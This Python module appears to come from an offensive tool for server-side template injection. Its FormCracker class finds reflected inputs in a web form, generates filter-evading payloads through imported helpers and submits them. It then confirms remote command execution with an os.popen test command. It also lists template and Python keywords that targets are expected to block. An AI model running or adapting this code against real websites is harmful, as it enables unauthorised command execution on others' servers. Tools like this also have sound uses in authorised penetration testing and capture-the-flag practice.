from collections import namedtuple
import logging
from typing import List, Dict, Any, Union, Callable

from .form import random_fill, fill_form
from .requester import Requester
from .colorize import colored
from .const import *
from .waf_func_gen import WafFuncGen
from .full_payload_gen import FullPayloadGen

logger = logging.getLogger("form_cracker")
Result = namedtuple("Result", "full_payload_gen input_field")


class FormCracker:
    """
    对指定的文档进行攻击
    """
    dangerous_keywords = [
        "config", "self", "os", "class", "mro", "base", "request",
        "attr", "open", "system",
        "[", '"', "'", "_", ".", "+", "{{", "|",
        "0", "1", "2",
    ]
    test_cmd = "echo f3n  j1ng;"
    test_result = "f3n j1ng"

    def __init__(
            self,
            url: str,
            form: Dict[str, Any],
            requester: Requester,
            callback: Union[Callable[[str, Dict], None], None] = None
    ):
        """生成用于攻击form的类

        Args:
            url (str, optional): form所在的url.
            form (dict): 解析后的form元素
            requester (Requester, optional): 用于发出请求的requester，为None时自动构造.
            callback (Union[Callable[[str, Dict], None], None]): callback函数，在完成某些阶段后会调用此函数
        """
        self.url = url
        self.form = form
        self.req = requester
        self._callback: Callable[[str, Dict], None] = callback if callback else (
            lambda x, y: None)
        self.waf_func_gen = WafFuncGen(self.url, self.form, self.req, self.callback)

    @property
    def callback(self):
        return self._callback
    
    @callback.setter
    def callback(self, callback):
        self._callback = callback

    def vulunable_inputs(self) -> List[str]:
        """解析出form中有回显的input

        Returns:
            List[str]: 所有有回显的input name
        """
        fill_dict = random_fill(self.form)
        r = self.req.request(
            **fill_form(
                self.url,
                self.form,
                form_inputs=fill_dict))
        assert r is not None
        return [
            k for k, v in fill_dict.items()
            if v in r.text
        ]

    def submit(self, inputs: dict):
        """根据inputs提交form

        Args:
            inputs (dict): 需要提交的input

        Returns:
            requests.Response: 返回的reponse元素
        """
        all_length = sum(len(v) for v in inputs.values())
        if all_length > 2048 and self.form["method"] == "GET":
            logger.warning(
                f"inputs are extremely long (len={all_length}) that the request might fail")

        r = self.req.request(
            **fill_form(self.url, self.form, inputs))

        self.callback(CALLBACK_SUBMIT, {
            "form": self.form,
            "inputs": inputs,
            "response": r,
        })

        return r

    def test_input(self, input_field, payload):
        logger.info(
            f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
        r = self.submit({input_field: payload})
        assert r is not None
        return self.test_result in r.text

    def crack_inputs(self, input_field: str) -> Union[Result, None]:
        """攻击对应的input

        Args:
            input_field (str): 需要攻击的input

        Returns:
            Union[Result, None]: 对应的payload生成函数，以及对应的input
        """
        logger.info(f"Testing {colored('yellow', input_field)}")

        waf_func = self.waf_func_gen.generate(input_field)
        full_payload_gen = FullPayloadGen(waf_func, callback=self.callback)
        payload, will_print = full_payload_gen.generate(
            OS_POPEN_READ, self.test_cmd)
        if payload is None:
            self.callback(CALLBACK_TEST_FORM_INPUT, {
                "ok": False,
            })
            return None

        is_test_success = None  # payload测试成功时为True, 失败时为False, 无法测试为None
        if will_print:
            if self.test_input(input_field, payload):
                logger.info(
                    f"{colored('green', 'Success!')} Now we can generate payloads.")
                is_test_success = True
            else:
                logger.info(
                    f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
        else:
            logger.info(
                f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
                "You can try generating payloads anyway.")

        self.callback(CALLBACK_TEST_FORM_INPUT, {
            "ok": True,
            "will_print": will_print,
            "test_success": is_test_success,
            "input_field": input_field
        })
        return Result(
            full_payload_gen=full_payload_gen,
            input_field=input_field
        )

    def crack(self) -> Union[Result, None]:
        """攻击表单

        Returns:
            Union[Result, None]: 对应的payload生成函数，以及对应的input
        """
        logger.info(f"Start cracking {self.form}")
        vulunables = self.vulunable_inputs()
        logger.info(
            f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")

        for input_field in vulunables:
            result = self.crack_inputs(input_field)
            if result:
                return result
        logger.warning(f"Failed...")
        return None
